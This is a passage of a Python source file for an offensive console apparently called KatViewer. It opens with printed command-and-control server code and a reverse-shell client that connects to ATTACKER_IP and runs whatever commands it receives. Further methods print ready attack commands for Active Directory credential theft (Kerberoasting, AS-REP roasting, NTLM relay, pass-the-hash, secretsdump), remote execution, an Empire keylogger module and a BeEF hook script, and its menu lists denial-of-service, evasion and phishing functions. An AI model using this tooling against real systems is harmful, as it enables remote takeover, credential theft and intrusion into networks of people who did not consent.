import socket,threading  
def handle(conn,addr):  
    while True:  
        cmd=input("C2> ")  
        if cmd=='exit':break  
        conn.send(cmd.encode())  
        print(conn.recv(4096).decode())  
    conn.close()  
s=socket.socket();s.bind(("0.0.0.0",{port}));s.listen(5)  
while True:  
    conn,addr=s.accept()  
    threading.Thread(target=handle,args=(conn,addr)).start()  
""")  
        print(f"""{Colors.GREEN}[+] Client code:{Colors.RESET}  
import socket,subprocess,os  
s=socket.socket();s.connect(("ATTACKER_IP",{port}))  
while True:  
    cmd=s.recv(4096).decode()  
    if cmd=='exit':break  
    if cmd.startswith('cd '):os.chdir(cmd[3:]);s.send(b'OK')  
    else:  
        r=subprocess.run(cmd,shell=True,capture_output=True,text=True)  
        s.send((r.stdout+r.stderr).encode() if r.stdout+r.stderr else b'Done')  
s.close()  
""")  
  
    def do_kerberos_enum(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: kerberos_enum <domain>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== KERBEROS ENUM: {target} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Check port 88: nmap -p 88 {target}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] kerbrute userenum -d {target} usernames.txt{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] python3 GetNPUsers.py {target}/ -usersfile users.txt -dc-ip <dc_ip>{Colors.RESET}")  
  
    def do_asrep_roast(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: asrep_roast <domain>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== ASREP ROAST: {target} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] python3 GetNPUsers.py {target}/ -usersfile users.txt -dc-ip <dc_ip>{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt{Colors.RESET}")  
  
    def do_kerberoast(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: kerberoast <domain>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== KERBEROAST: {target} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] python3 GetUserSPNs.py {target}/ -dc-ip <dc_ip> -request{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt{Colors.RESET}")  
  
    def do_bloodhound(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: bloodhound <domain>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== BLOODHOUND: {target} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] sharphound -c All -d {target}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Ingest ZIP into BloodHound GUI{Colors.RESET}")  
  
    def do_responder(self, arg):  
        iface = arg or 'eth0'  
        print(f"\n{Colors.BORDER}=== RESPONDER: {iface} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] responder -I {iface} -dwf{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Captures in /usr/share/responder/logs/{Colors.RESET}")  
  
    def do_mitm6(self, arg):  
        iface = arg or 'eth0'  
        print(f"\n{Colors.BORDER}=== MITM6: {iface} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] mitm6 -i {iface} -d <domain>{Colors.RESET}")  
  
    def do_ntlm_relay(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: ntlm_relay <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== NTLM RELAY ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] impacket-ntlmrelayx -tf targets.txt -smb2support{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Target: {target}{Colors.RESET}")  
  
    def do_pass_the_hash(self, arg):  
        parts = arg.split()  
        if len(parts) < 2:  
            print(f"{Colors.RED}Usage: pass_the_hash <target> <user:hash>{Colors.RESET}")  
            return  
        target = parts[0]  
        print(f"\n{Colors.BORDER}=== PASS THE HASH: {target} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] pth-winexe -U {parts[1]}% //{target} cmd{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] impacket-psexec -hashes :{parts[1].split(':')[1] if ':' in parts[1] else ''} {target}{Colors.RESET}")  
  
    def do_secretsdump(self, arg):  
        parts = arg.split()  
        if len(parts) < 2:  
            print(f"{Colors.RED}Usage: secretsdump <target> <user:pass>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SECRETSDUMP ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] impacket-secretsdump -just-dc {parts[1]}@{parts[0]}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] impacket-secretsdump -sam -system {parts[0]} --local{Colors.RESET}")  
  
    def do_psexec(self, arg):  
        parts = arg.split()  
        if len(parts) < 2:  
            print(f"{Colors.RED}Usage: psexec <target> <user:pass>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== PSEXEC ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] impacket-psexec {parts[1]}@{parts[0]}{Colors.RESET}")  
  
    def do_wmiexec(self, arg):  
        parts = arg.split()  
        if len(parts) < 2:  
            print(f"{Colors.RED}Usage: wmiexec <target> <user:pass>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== WMIEXEC ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] impacket-wmiexec {parts[1]}@{parts[0]}{Colors.RESET}")  
  
    def do_smbexec(self, arg):  
        parts = arg.split()  
        if len(parts) < 2:  
            print(f"{Colors.RED}Usage: smbexec <target> <user:pass>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SMBEXEC ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] impacket-smbexec {parts[1]}@{parts[0]}{Colors.RESET}")  
  
    def do_smb_enum(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: smb_enum <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SMB ENUM: {target} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] smbclient -L //{target} -N{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] smbmap -H {target}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] enum4linux -a {target}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] crackmapexec smb {target} --shares{Colors.RESET}")  
  
    def do_ssh_audit(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: ssh_audit <ip>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== SSH AUDIT: {target} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] ssh-audit {target}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] nmap --script ssh2-enum-algos -p 22 {target}{Colors.RESET}")  
  
    def do_tls_scan(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: tls_scan <host>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== TLS SCAN: {target} ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] testssl.sh {target}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] sslscan {target}{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] nmap --script ssl-enum-ciphers -p 443 {target}{Colors.RESET}")  
  
    def do_cert_check(self, arg):  
        target = arg or self.target  
        if not target:  
            print(f"{Colors.RED}Usage: cert_check <host>{Colors.RESET}")  
            return  
        print(f"\n{Colors.BORDER}=== CERT CHECK: {target} ==={Colors.RESET}")  
        try:  
            ctx = ssl.create_default_context()  
            ctx.check_hostname = False  
            ctx.verify_mode = ssl.CERT_NONE  
            s = ctx.wrap_socket(socket.socket(), server_hostname=target)  
            s.settimeout(self.timeout)  
            s.connect((target, 443))  
            cert = s.getpeercert()  
            print(f"{Colors.GREEN}[+] Subject: {cert.get('subject', [])}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] Issuer: {cert.get('issuer', [])}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] Valid until: {cert.get('notAfter', 'N/A')}{Colors.RESET}")  
            print(f"{Colors.GREEN}[+] SANs: {cert.get('subjectAltName', [])}{Colors.RESET}")  
            s.close()  
        except Exception as e:  
            print(f"{Colors.RED}Failed: {e}{Colors.RESET}")  
  
    def do_html_report(self, arg):  
        print(f"\n{Colors.BORDER}=== GENERATE REPORT ==={Colors.RESET}")  
        html = f'''<!DOCTYPE html><html><head><title>KatViewer Report</title><style>body{{font-family:Arial;margin:20px;background:#0a0a2e;color:#00ffff}}h1{{color:#00aaff;border-bottom:2px solid #0044ff}}.box{{border:1px solid #0044ff;padding:15px;margin:10px 0;background:#000033}}</style></head><body><h1>KatViewer Security Report</h1><div class="box"><p><strong>Target:</strong> {self.target or 'N/A'}</p><p><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p><p><strong>Status:</strong> Assessment Complete</p></div><div class="box"><p>Testing performed by authorized security professionals only.</p></div></body></html>'''  
        path = f"{self.output_dir}/report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"  
        with open(path, 'w') as f: f.write(html)  
        print(f"{Colors.GREEN}[+] Report saved: {path}{Colors.RESET}")  
  
    def do_empire_commands(self, arg):  
        print(f"\n{Colors.BORDER}=== EMPIRE FRAMEWORK ==={Colors.RESET}")  
        cmds = ['powershell-empire server','powershell-empire client','uselistener http','set Host http://0.0.0.0:8080','execute','usestager windows/launcher_bat','set Listener http','execute','agents','interact <agent_name>','usemodule powershell/collection/keylog']  
        for cmd in cmds:  
            print(f"{Colors.GREEN}[+] {cmd}{Colors.RESET}")  
  
    def do_beef_commands(self, arg):  
        print(f"\n{Colors.BORDER}=== BEEF FRAMEWORK ==={Colors.RESET}")  
        print(f"{Colors.GREEN}[+] beef-xss{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Web UI: http://127.0.0.1:3000/ui/panel{Colors.RESET}")  
        print(f"{Colors.GREEN}[+] Hook: <script src=\'http://YOUR_IP:3000/hook.js\'></script>{Colors.RESET}")  
  
    def do_help(self, arg):  
        if arg:  
            cmd_name = arg.strip()  
            handler = getattr(self, f'do_{cmd_name}', None)  
            if handler:  
                doc = handler.__doc__  
                if doc:  
                    print(f"\n{Colors.BORDER}=== HELP: {cmd_name} ==={Colors.RESET}")  
                    print(f"{Colors.CYAN}{doc}{Colors.RESET}")  
                else:  
                    print(f"{Colors.YELLOW}[!] No documentation{Colors.RESET}")  
            else:  
                print(f"{Colors.RED}Unknown command: {cmd_name}{Colors.RESET}")  
            return  
        print(f"""  
{Colors.BORDER}========================== KATVIEWER COMMANDS =========================={Colors.RESET}  
  
{Colors.CYAN}SESSION:{Colors.RESET}    set_target  set_port  set_threads  set_timeout  verbose  status  clear  exit  
  
{Colors.CYAN}RECON:{Colors.RESET}        recon  dns_enum  dns_bruteforce  port_scan  os_detect  service_scan  
{Colors.CYAN}               {Colors.RESET}         http_enum  dir_bruteforce  whois  geoip  traceroute  net_scan  arp_scan  sniff  
  
{Colors.CYAN}WEB:{Colors.RESET}           web_vuln  sql_inject  xss_scan  bruteforce_http  wpscan  nikto_scan  
{Colors.CYAN}               {Colors.RESET}         gobuster_scan  sqlmap_basic  git_dump  backup_scan  s3_enum  
  
{Colors.CYAN}BRUTEFORCE:{Colors.RESET}   bf_ssh  bf_ftp  email_enum  smtp_enum  
  
{Colors.CYAN}EXPLOIT:{Colors.RESET}      ms17_010  smbghost  bluekeep  rdp_check  vnc_check  reverse_shell  
{Colors.CYAN}               {Colors.RESET}         bind_shell  msf_payload  psexec  wmiexec  smbexec  secretsdump  
  
{Colors.CYAN}ACTIVE DIRECTORY:{Colors.RESET}  kerberos_enum  asrep_roast  kerberoast  bloodhound  responder  
{Colors.CYAN}               {Colors.RESET}              mitm6  ntlm_relay  pass_the_hash  smb_enum  
  
{Colors.CYAN}DOS:{Colors.RESET}          dos_http  dos_syn  dos_udp  dos_icmp  dos_amp  
  
{Colors.CYAN}TUNNEL:{Colors.RESET}      dns_tunnel  icmp_tunnel  http_tunnel  proxy_chain  socks_proxy  
{Colors.CYAN}               {Colors.RESET}         ngrok_setup  cloudflare_tunnel  c2_basic  
  
{Colors.CYAN}CRYPTO:{Colors.RESET}      encrypt  hash_crack  gen_password  gen_wordlist  ssh_keygen  shell_encode  
  
{Colors.CYAN}FRAMEWORKS:{Colors.RESET}  metasploit_commands  empire_commands  beef_commands  
  
{Colors.CYAN}MISC:{Colors.RESET}        persistence  evasion  phishing  ssh_audit  tls_scan  cert_check  
{Colors.CYAN}               {Colors.RESET}         cve_search  exploit_search  html_report  
  
{Colors.YELLOW}Use: help <command> for detailed info  |  Type exit to quit{Colors.RESET}  
""")  
  
if __name__ == '__main__':  
    try:  
        KatViewer().cmdloop()  
    except KeyboardInterrupt:  
        print(f"\n{Colors.YELLOW}[!] Interrupted. Exiting...{Colors.RESET}")  
        sys.exit(0)  
